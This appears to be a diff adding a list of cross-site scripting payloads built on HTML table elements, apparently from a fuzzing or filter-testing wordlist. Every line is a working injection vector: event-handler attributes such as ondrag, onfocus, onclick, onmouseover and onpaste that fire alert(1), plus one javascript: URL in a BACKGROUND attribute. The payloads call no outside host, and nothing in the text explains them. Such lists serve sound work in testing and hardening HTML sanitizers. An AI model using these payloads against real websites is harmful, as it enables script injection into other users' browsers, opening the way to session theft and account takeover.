@@ -1,0 +1,29 @@
+<table draggable="true" ondrag="alert(1)">test</table>
+<table draggable="true" ondragend="alert(1)">test</table>
+<table draggable="true" ondragenter="alert(1)">test</table>
+<table draggable="true" ondragleave="alert(1)">test</table>
+<table draggable="true" ondragstart="alert(1)">test</table>
+<table id=x tabindex=1 onactivate=alert(1)></table>
+<table id=x tabindex=1 onbeforeactivate=alert(1)></table>
+<table id=x tabindex=1 onfocus=alert(1)></table>
+<table id=x tabindex=1 onfocusin=alert(1)></table>
+<table onbeforecopy="alert(1)" contenteditable>test</table>
+<table onbeforecut="alert(1)" contenteditable>test</table>
+<table onbeforepaste="alert(1)" contenteditable>test</table>
+<table onclick="alert(1)">test</table>
+<table oncontextmenu="alert(1)">test</table>
+<table oncopy="alert(1)" contenteditable>test</table>
+<table oncut="alert(1)" contenteditable>test</table>
+<table ondblclick="alert(1)">test</table>
+<table onkeydown="alert(1)" contenteditable>test</table>
+<table onkeypress="alert(1)" contenteditable>test</table>
+<table onkeyup="alert(1)" contenteditable>test</table>
+<table onmousedown="alert(1)">test</table>
+<table onmouseenter="alert(1)">test</table>
+<table onmouseleave="alert(1)">test</table>
+<table onmousemove="alert(1)">test</table>
+<table onmouseout="alert(1)">test</table>
+<table onmouseover="alert(1)">test</table>
+<table onmouseup="alert(1)">test</table>
+<table onpaste="alert(1)" contenteditable>test</table>
+<TABLE BACKGROUND="javascript:alert('XSS')">
